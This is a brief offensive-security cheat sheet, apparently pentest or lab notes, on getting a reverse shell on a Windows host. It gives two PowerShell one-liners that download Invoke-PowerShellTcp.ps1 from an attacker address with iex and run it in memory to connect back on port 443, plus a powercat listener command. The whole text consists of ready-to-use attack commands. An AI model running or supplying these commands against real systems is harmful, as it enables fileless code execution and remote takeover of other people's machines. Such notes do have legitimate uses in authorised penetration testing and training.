<aside>
💡 Downloading a file from the attacker machine and running it memory.
Initialising a reverse shell with `Invoke-PowerShellTcp.ps1`
Listening with `PowerCat.ps1`

</aside>

Download file and run in memory, method 1 👇

`powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('[http://172.16.100.X/Invoke-](http://172.16.100.x/Invoke-)PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443`

Download file and run in memory, method 2 👇

`powershell.exe iex (iwr [http://172.16.100.X/Invoke-PowerShellTcp.ps1](http://172.16.100.x/Invoke-PowerShellTcp.ps1) -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443`

Listening with `powercat.ps1`👇

`powercat -l -v -p 443 -t 100`
